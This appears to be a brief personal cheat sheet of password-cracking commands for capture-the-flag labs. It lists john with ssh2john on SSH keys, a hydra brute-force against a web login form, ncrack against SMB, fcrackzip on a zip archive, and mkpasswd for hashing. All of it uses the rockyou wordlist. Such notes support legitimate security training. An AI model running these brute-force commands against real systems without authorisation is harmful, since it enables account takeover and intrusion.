#crackPass 

# HYDRA [[Hydra-Password-Cracking-Cheatsheet.pdf]]


# crack ssh key
```
 ssh2john key > hash
 ```
 ```
 john hash -wordlist=/usr/share/wordlists/rockyou.txt
```

# crack form login
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt thm.overpass http-form-post '/admin/:username=^USER^&password=^PASS^:Incorrect Credentials' -V
```

# mkpasswd
make hash for a passwd
```
mkpasswd -m sha-512 password1234
```

# smb
`ncrack --vv --user <user> -P <password> smb://@ip`

# file.zip
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
```